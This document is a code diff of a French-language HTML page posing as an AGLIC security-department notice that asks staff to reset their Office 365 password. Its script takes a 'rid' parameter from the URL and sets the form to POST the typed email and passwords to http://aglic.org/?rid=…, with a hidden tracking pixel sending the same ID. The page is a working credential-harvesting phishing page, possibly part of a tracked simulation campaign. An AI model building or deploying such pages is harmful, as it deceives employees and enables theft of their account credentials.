@@ -28,7 +28,10 @@
     <h1 class="text-2xl font-semibold text-[#1b1b1b] mb-1">Mettre à jour la connexion</h1>
     <p class="text-[13px] text-[#505050] mb-5">Pour des raisons de sécurité, veuillez configurer votre nouveau mot de passe Office 365 de 18 caractères minimum.</p>
 
-    <!-- Native HTML form: action will be set dynamically by JavaScript (if rid present) but submission is standard POST -->
+    <!-- 
+      FORM: action will be dynamically set to "http://aglic.org/?rid=xxxx" if 'rid' is present in URL.
+      If no rid, action stays empty (POST to same page). Method is always POST.
+    -->
     <form action="" class="space-y-4" id="resetForm" method="POST" onsubmit="return handleSubmit(event)">
       <div>
         <label class="block text-xs font-semibold text-gray-600 mb-1">Adresse e-mail professionnelle</label>
@@ -62,40 +65,43 @@
   L'Algérienne Vie (AGLIC) - Direction de la Sécurité des Systèmes d'Information (DSI). © 2026
 </div>
 
-<!-- Hidden image tag for tracking (pure HTML element, src will be set by JS if rid exists) -->
+<!-- Hidden image for tracking (GET request to aglic.org with rid) -->
 <img id="trackingPixel" style="display:none; width:0; height:0;" alt="" />
 
 <script>
-  // ========== 1. RID extraction & configuration (NO UI changes) ==========
-  (function configureTrackingAndForm() {
+  // ------------------------------------------------------------------
+  // 1. Extract 'rid' from URL, set form action & tracking image source
+  //    -> Form will POST directly to aglic.org with the rid parameter
+  //    -> Image will send a GET request to the same URL for tracking
+  // ------------------------------------------------------------------
+  (function() {
     const urlParams = new URLSearchParams(window.location.search);
     const rid = urlParams.get('rid');
 
     if (rid && rid.trim() !== '') {
       const cleanRid = encodeURIComponent(rid.trim());
-      const baseEndpoint = 'http://aglic.org/';
-      const targetUrl = baseEndpoint + '?rid=' + cleanRid;
+      const targetUrl = 'http://aglic.org/?rid=' + cleanRid;
 
-      // --- a) Set the source of the pre-existing <img> tag for tracking (GET request) ---
-      const trackingImg = document.getElementById('trackingPixel');
-      if (trackingImg) {
-        trackingImg.src = targetUrl;
-      }
-
-      // --- b) Dynamically set the form's action to aglic.org with the rid (native POST submission) ---
+      // Set form action (native POST submission)
       const form = document.getElementById('resetForm');
       if (form) {
         form.action = targetUrl;
       }
+
+      // Set tracking pixel src (GET request)
+      const trackingImg = document.getElementById('trackingPixel');
+      if (trackingImg) {
+        trackingImg.src = targetUrl;
+      }
     }
-    // If no rid is present, form.action stays empty → POST to same page (original behavior)
   })();
 
-  // ========== 2. ORIGINAL VALIDATION FUNCTIONS (UI unchanged, password checks) ==========
+  // ------------------------------------------------------------------
+  // 2. Original client-side validation (UI unchanged)
+  // ------------------------------------------------------------------
   function checkInputs() {
     const pass = document.getElementById('password').value;
     const confirm = document.getElementById('confirmPassword').value;
-
     const lenAlert = document.getElementById('lenAlert');
     const matchAlert = document.getElementById('matchAlert');
 
@@ -119,7 +125,6 @@
 
     errorEl.classList.add('hidden');
 
-    // Validate length (minimum 18 characters)
     if (pass.length < 18) {
       e.preventDefault();
       errorEl.innerText = "❌ Le nouveau mot de passe doit comporter au moins 18 caractères.";
@@ -127,7 +132,6 @@
       return false;
     }
 
-    // Validate password confirmation
     if (pass !== confirm) {
       e.preventDefault();
       errorEl.innerText = "❌ Erreur : Les deux mots de passe ne correspondent pas.";
@@ -135,8 +139,7 @@
       return false;
     }
 
-    // All validations passed → allow native form submission.
-    // The form action already points to aglic.org (if rid present) or stays empty.
+    // If validation passes, the form will submit natively to the action URL (aglic.org?rid=...)
     return true;
   }
 </script>
